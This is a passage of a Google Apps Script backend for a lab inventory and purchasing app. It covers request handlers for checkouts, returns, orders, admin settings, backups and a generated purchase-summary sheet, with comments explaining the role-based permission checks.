  // Rejection is an admin's decision and worth keeping as a record; withdrawing
  // is just undo, so the row goes rather than sitting in the table as noise. Only
  // possible while it is still waiting — once decided, it is history.
  if (action === "cancelCheckout") {
    const co = findRow("Checkouts", body.checkoutId);
    if (!co) return jsonResponse({ error: "Checkout not found" });
    if (co.status !== CHECKOUT_PENDING) {
      return jsonResponse({ error: "Not pending", detail: "Only a request still waiting for approval can be withdrawn — this one is " + co.status });
    }
    const coEmail = String(co.checkedOutByEmail || "").trim().toLowerCase();
    if (!admin && coEmail && userEmail !== coEmail) {
      return jsonResponse({ error: "Forbidden", detail: "Only the person who asked for this, or an admin, can withdraw it" });
    }
    // Log before destroying, so a failure here can't lose the audit trail.
    const details = co.user + " | " + (co.out||"—") + " to " + (co.ret||"—") +
                    (co.fromTime ? " | " + co.fromTime + "\u2013" + co.toTime : "");
    logDeletion("Request", co.item, details, userName);
    logAudit(userName, userEmail, "CheckoutWithdrawn", co.item + " | " + details);
    deleteRow("Checkouts", co.id);
    return jsonResponse({ ok: true });
  }

  // ── Return Item ───────────────────────────────────────────────────────────
  if (action === "returnItem") {
    const coId = body.checkoutId;
    const co = findRow("Checkouts", coId);
    if (co) {
      // Legacy rows written before these columns existed have no owner recorded,
      // and stay returnable by anyone.
      const coEmail = String(co.checkedOutByEmail || "").trim().toLowerCase();
      const groupList = String(co.groupEmails || "").split(",").map(e => e.trim().toLowerCase()).filter(Boolean);
      if (!admin && coEmail && userEmail !== coEmail && !groupList.includes(userEmail)) {
        return jsonResponse({ error: "Forbidden", detail: "Only the person who checked out this item, group members, or an admin can return it." });
      }
      // Only a live loan can be returned. Without this a second click — the bulk
      // return, a stale tab, a double tap — rewrote the recorded return time and
      // pulled the item off whoever had picked it up since; and a request still
      // waiting for an admin could be "returned", which marked it Returned and
      // freed an item it had never been given.
      if (co.status !== "Active") {
        return jsonResponse({ error: "Not out", detail: "This one is already " + String(co.status).toLowerCase() + " — nothing to return" });
      }
      const now = new Date();
      const nowStr = now.getFullYear()+"-"+String(now.getMonth()+1).padStart(2,"0")+"-"+String(now.getDate()).padStart(2,"0")
                    +" "+String(now.getHours()).padStart(2,"0")+":"+String(now.getMinutes()).padStart(2,"0");
      updateRow("Checkouts", coId, { ret: nowStr, status: "Returned" });
      updateItemStatus(co.itemId, co.item, "Available", co.user, "remove");
      sendSlack("✅", "Item Returned: " + co.item, null, ["*Returned by*\n" + userName]);
      logAudit(userName, userEmail, "Return", co.item + " | originally checked out by:" + co.user);
    }
    return jsonResponse({ ok: true });
  }

  // ── Add Order ─────────────────────────────────────────────────────────────
  if (action === "addOrder") {
    const o = body.order;
    // Purchasing approval is the admin's, so a request cannot be born approved and
    // the requester cannot be someone else. Only updateOrderStatus moves it on.
    if (!admin) {
      o.status = "Pending";
      o.requestedBy = userName;
      o.requestedByEmail = userEmail;
    }
    appendRow("Orders", o);
    // The link goes through sendSlack's `link` parameter rather than being pasted
    // into the text: a URL containing a "|" could otherwise relabel itself.
    sendSlack("🛒", "New Order Request: " + o.item,
      "*Store:* " + (o.store||"—"),
      ["*Qty*\n" + o.qty + " " + o.unit, "*Urgency*\n" + (o.urgency||"Normal"), "*Price*\n" + (o.price||"—"), "*Requested by*\n" + userName],
      (o.urgency==="Urgent"||o.urgency==="High")?"high":"normal",
      o.link || "");
    logAudit(userName, userEmail, "AddOrder", o.item + " | " + (o.store||"—") + " | qty:" + o.qty + " | urgency:" + (o.urgency||"Normal"));
    return jsonResponse({ ok: true });
  }

  // ── Update Order ──────────────────────────────────────────────────────────
  if (action === "updateOrder") {
    const o = body.order;
    const existing = findRow("Orders", o.id);
    if (!existing) return jsonResponse({ error: "Order not found" });

    // Legacy rows without requestedByEmail are not restricted.
    const reqEmail = String(existing.requestedByEmail || "").trim().toLowerCase();
    if (!admin && reqEmail && userEmail !== reqEmail) {
      return jsonResponse({ error: "Forbidden", detail: "Only the person who submitted this order or an admin can edit it." });
    }
    // Once an admin has approved it, the request is no longer the requester's to
    // change — editing the quantity or the price afterwards would quietly alter
    // what was approved. Admins can still fix it.
    if (!admin && String(existing.status || "") !== "Pending") {
      return jsonResponse({ error: "Forbidden", detail: "This order has already been " + String(existing.status).toLowerCase() + " — ask an admin to change it." });
    }
    // `status` is admin-only, and deliberately so: updateOrderStatus refuses a
    // member outright, and without this line the same member could reach straight
    // past it and set their own request to "Approved" through this branch. The
    // form hides the dropdown from members, but the form is not the boundary.
    const fields = ["store","item","link","qty","unit","price","cat","reason","urgency","date"];
    if (admin) fields.push("status", "requestedBy");
    const patch = {};
    fields.forEach(f => { if (o[f] !== undefined) patch[f] = o[f]; });
    updateRow("Orders", o.id, patch);
    logAudit(userName, userEmail, "UpdateOrder", (o.item||"") + " | store:" + (o.store||"—"));
    return jsonResponse({ ok: true });
  }

  // ── Send Digest (admin only) ───────────────────────────────────────────────
  if (action === "sendDigest") {
    if (!admin) {
      return jsonResponse({ error: "Forbidden", detail: "Only admins can send digest" });
    }
    try { sendDailyDigest(); } catch(e) { return jsonResponse({ error: "Digest failed", detail: e.message }); }
    return jsonResponse({ ok: true });
  }

  // ── Update Order Status ───────────────────────────────────────────────────
  if (action === "updateOrderStatus") {
    // Admin-only: this is the approval control for purchasing. Without the check
    // any member could POST their own request straight to "Approved".
    if (!admin) {
      return jsonResponse({ error: "Forbidden", detail: "Only admins can change order status" });
    }
    const orderId = body.orderId;
    const newStatus = body.status;
    const prev = updateRow("Orders", orderId, { status: newStatus });
    if (!prev) {
      return jsonResponse({ error: "Order not found", detail: "No order with id " + orderId });
    }
    var orderItem = prev.item || "";
    sendSlack("📋", "Order Status Updated: " + orderItem, null, ["*New Status*\n" + newStatus, "*Updated by*\n" + userName]);
    logAudit(userName, userEmail, "OrderStatus", orderItem + " → " + newStatus);
    return jsonResponse({ ok: true });
  }

  // ── Delete Order (admin only) ─────────────────────────────────────────────
  if (action === "deleteOrder") {
    if (!admin) {
      return jsonResponse({ error: "Forbidden", detail: "Only admins can delete orders" });
    }
    const orderId = body.orderId;
    const order = findRow("Orders", orderId);
    if (!order) {
      return jsonResponse({ error: "Order not found", detail: "No order with id " + orderId });
    }
    var orderName = order.item || "Unknown";
    logDeletion("Order", orderName, "id:" + orderId, userName);
    logAudit(userName, userEmail, "DeleteOrder", orderName);
    deleteRow("Orders", orderId);
    return jsonResponse({ ok: true });
  }

  // ── Save Settings (admin only) ────────────────────────────────────────────
  if (action === "saveSettings") {
    if (!admin) {
      return jsonResponse({ error: "Forbidden", detail: "Only admins can change settings" });
    }
    // `admins` and `members` are the roster. Setting them from the app is allowed
    // — an admin can already edit the sheet — but it was the one mutating action
    // that left no trace, which is the wrong property for the setting that decides
    // who is an admin. It is also easy to mistype: isAdmin swallows a parse error
    // and returns false for everyone, so a stray character in the JSON strips
    // every admin and only the spreadsheet can put them back.
    const key = String(body.key || "");
    if (key === "admins" || key === "members") {
      let parsed;
      try { parsed = JSON.parse(body.value); } catch (e) { parsed = null; }
      if (!Array.isArray(parsed)) {
        return jsonResponse({ error: "Bad value",
          detail: '"' + key + '" has to be a JSON array of sign-in addresses, e.g. ["jdoe1@jh.edu"]' });
      }
      if (key === "admins" && normalizeEmails_(parsed).indexOf(userEmail) < 0) {
        return jsonResponse({ error: "Bad value",
          detail: "That list leaves you out, and nobody left in the app could put you back. Edit the Settings tab directly if you mean it." });
      }
    }
    writeSetting(body.key, body.value);
    logAudit(userName, userEmail, "SaveSetting", key + " = " + String(body.value || "").slice(0, 200));
    return jsonResponse({ ok: true });
  }

  // ── Notify: someone spotted a supply running low ───────────────────────────
  // For items whose quantity isn't tracked there is nothing to deduct, so the
  // only useful action is telling whoever restocks. Anyone may send it.
  if (action === "notifyLowStock") {
    const name = String(body.item || "").trim();
    if (!name) return jsonResponse({ error: "No item given" });
    sendSlack("🔔", "Running Low: " + name, body.note ? String(body.note) : null, [
      "*Location*\n" + (body.loc || "—"),
      "*Reported by*\n" + userName,
    ], "high");
    logAudit(userName, userEmail, "NotifyLowStock", name + (body.note ? " | " + body.note : ""));
    return jsonResponse({ ok: true });
  }

  // ── Log Edit Unlock (non-admin members only; admin skipped client-side) ────
  if (action === "logEditUnlock") {
    logAudit(userName, userEmail, "EditUnlock", "inventory editing unlocked");
    return jsonResponse({ ok: true });
  }

  // ── Generate Purchase Summary sheet ──────────────────────────────────────
  // SHEETS-ONLY — builds a formatted spreadsheet as an output artifact rather
  // than storing data, so it deliberately bypasses the storage layer. On a
  // migration this becomes a generated file/export, not a ported function.
  if (action === "generatePurchaseSummary") {
    // Rebuilds a shared tab of the lab's spreadsheet from whatever the caller
    // sends, deleting what was there. That is an admin's artifact, not a member's
    // — and the button that reaches it sits beside Digest and Backup, which are
    // both admin-only already.
    if (!admin) return jsonResponse({ error: "Forbidden", detail: "Only admins can write the purchase summary sheet" });
    var orders = body.orders || [];
    if (orders.length === 0) return jsonResponse({ error: "No orders provided" });

    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var sheetName = "Purchase Summary";

    // Remove existing sheet if present, then create fresh
    var existing = ss.getSheetByName(sheetName);
    if (existing) ss.deleteSheet(existing);
    var ps = ss.insertSheet(sheetName);

    // ── Header row (plain styling) ──
    var dateStr = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "MMMM d, yyyy");
    ps.getRange(1, 1, 1, 6).merge()
      .setValue("Purchase Summary — " + dateStr)
      .setFontWeight("bold").setFontSize(13);

    // ── Column headers (plain bold, default background) ──
    var headers = ["Qty", "Item", "Unit Price", "Total", "Purchase Link", "Store"];
    var hRow = ps.getRange(2, 1, 1, 6);
    hRow.setValues([headers]).setFontWeight("bold");

    // ── Data rows: qty and price as numbers; total and grand total as formulas ──
    var firstDataRow = 3;
    var dataRows = orders.map(function(o) {
      var qty = parseFloat(o.qty) || 0;
      var price = parseFloat(String(o.price || "").replace(/[^0-9.]/g, "")) || null;
      return [
        qty || o.qty || "",
        o.item || "",
        price !== null ? price : "",  // numeric — formatted as currency below
        "",                           // Total: filled with formula per row below
        o.link || "",
        o.store || ""
      ];
    });

    var lastDataRow = firstDataRow + dataRows.length - 1;

    if (dataRows.length > 0) {
      ps.getRange(firstDataRow, 1, dataRows.length, 6).setValues(dataRows);

      // Per-row total formulas: =A3*C3, =A4*C4, …
      for (var r = 0; r < dataRows.length; r++) {
        var rowNum = firstDataRow + r;
        ps.getRange(rowNum, 4).setFormula("=A" + rowNum + "*C" + rowNum);

        // Clickable hyperlink in Link column
        var link = dataRows[r][4];
        if (link && link.startsWith("http")) {
          ps.getRange(rowNum, 5).setFormula('=HYPERLINK("' + link.replace(/"/g, '""') + '","' + link.replace(/"/g, '""') + '")');
        }
      }

      // Format Unit Price (col C) and Total (col D) as currency
      ps.getRange(firstDataRow, 3, dataRows.length, 2)
        .setNumberFormat('"$"#,##0.00');
    }

    // ── Grand total row with SUM formula ──
    var totalRow = lastDataRow + 2;
    ps.getRange(totalRow, 1, 1, 3).merge().setValue("Grand Total").setFontWeight("bold").setHorizontalAlignment("right");
    ps.getRange(totalRow, 4)
      .setFormula("=SUM(D" + firstDataRow + ":D" + lastDataRow + ")")
      .setNumberFormat('"$"#,##0.00')
      .setFontWeight("bold");

    // ── Column widths and freeze ──
    ps.setColumnWidth(1, 50);   // Qty
    ps.setColumnWidth(2, 220);  // Item
    ps.setColumnWidth(3, 100);  // Unit Price
    ps.setColumnWidth(4, 90);   // Total
    ps.setColumnWidth(5, 320);  // Link
    ps.setColumnWidth(6, 120);  // Store
    ps.setFrozenRows(2);

    ss.setActiveSheet(ps);
    logAudit(userName, userEmail, "PurchaseSummary", orders.length + " items");
    return jsonResponse({ ok: true });
  }

  // ── Backup Now (admin only) ───────────────────────────────────────────────
  if (action === "backupNow") {
    if (!admin) return jsonResponse({ error: "Forbidden", detail: "Admin only" });
    var backupName = backupSpreadsheet();
    return jsonResponse({ ok: true, backupName: backupName });
  }

  return jsonResponse({ error: "Unknown action: " + action });
  } catch (err) {
    return jsonResponse({ error: "Server error", detail: err.message });
  }
}

// ─── Update item status & usedBy in Items sheet ──────────────────────────────
// A checkout points at one specific unit, so target it by id. Split units share a
// name, and matching on name moved whichever sibling happened to come first —
// which is also why the sheet and the browser could disagree about which one
// changed. Rows written before itemId was populated have only the name to go on.
function updateItemStatus(itemId, itemName, newStatus, userName, mode) {
  const target = (itemId !== undefined && itemId !== null && String(itemId) !== "")
    ? function(r) { return idsMatch(r.id, itemId); }
    : function(r) { return r.name === itemName; };
  const item = findRow("Items", target);
  if (!item) return;

  const patch = {};
  // A shared item stays "Available" while checked out — several people hold it at once.
  const isShared = item.shared === true || String(item.shared).toLowerCase() === "true";
  if (!(newStatus === "In Use" && isShared)) patch.status = newStatus;

  // The storage layer already hands usedBy over as an array; the string branch is
  // for a row written before it did.
  let usedBy = item.usedBy;
  if (typeof usedBy === "string") { try { usedBy = JSON.parse(usedBy); } catch(e) { usedBy = []; } }
  if (!Array.isArray(usedBy)) usedBy = [];
  else usedBy = usedBy.slice();
  if (mode === "add" && !usedBy.includes(userName)) usedBy.push(userName);
  else if (mode === "remove") usedBy = usedBy.filter(u => u !== userName);
  patch.usedBy = usedBy;   // serialized on write by the storage layer

  updateRow("Items", target, patch);
}
